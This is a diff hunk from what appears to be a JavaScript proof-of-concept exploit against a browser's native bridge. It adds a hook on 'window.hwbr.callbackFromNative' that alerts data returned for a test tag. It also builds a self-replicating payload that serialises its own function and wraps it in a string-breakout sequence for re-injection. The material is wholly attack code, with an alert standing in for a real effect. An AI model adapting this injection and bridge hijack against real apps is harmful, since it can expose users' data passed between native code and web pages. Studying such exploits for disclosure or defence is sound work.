@@ -10,6 +10,13 @@
         window.current = location.href;
         function crazy() {
             if (window.noJump) {
+                window.hwbr = window.hwbr || {};
+                window.hwbr.callbackFromNative = function (a, b, c, d, e) {
+                    if (a == 'zdccctest') {
+                        alert(d.toString())
+                    }
+                };
+                
                 var funcString = crazy.toString().replaceAll('\n', '');
                 var funcCalling = '(()=>{' + funcString + ';crazy();})()';
                 var payload = '}\');' + funcCalling + '//';
